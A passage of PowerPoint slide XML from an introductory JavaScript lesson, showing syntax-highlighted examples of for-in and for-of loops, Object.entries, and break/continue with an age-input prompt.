              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>};</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</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key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>in</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</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obj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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"Bob Smith"</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age</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>55</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>};</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</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attr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>in</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obj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>attr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>obj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>attr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>]);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New"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AC25320A-25C5-47DA-ACFA-226A6B5FBA51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>for of</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50179" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A9979F8-682E-455F-ADE6-7BFABD003D3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1447211"/>
            <a:ext cx="10972800" cy="5136151"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>Iterates through all the values of an array or an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>iterable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>. ES6 feature.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>Syntax:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</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  /* value gets object */</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Examples:</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var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names</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"Jack"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>,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Jill</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A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Jane"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Bob"</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a:solidFill>
                  <a:srgbClr val="AF00DB"/>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of</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names</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document</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write</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;"</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d</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Ford:</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1</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Toyota:</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2</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Nissan:</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3</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a:solidFill>
                  <a:srgbClr val="AF00DB"/>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key</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of</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Object</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entries</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d</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key</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eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="020703090202050204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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{669542DC-B4F7-43CE-A5E8-6C85053BE80B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>break and continue</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51203" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7860BC9D-779F-4100-9E8A-347E264E1240}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>break</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> jumps out of the loop construct and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>continue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> goes to the beginning of the loop</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for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> (;;) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/* same as while(true) */</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">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s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>prompt</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"What is your age?"</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if</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s</a:t>
            </a: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continue</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age</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parseInt</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s</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if</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isNaN</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age</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) || </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>age</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &lt;= </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 {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>          </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>alert</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"Age must be positive number"</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>else</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
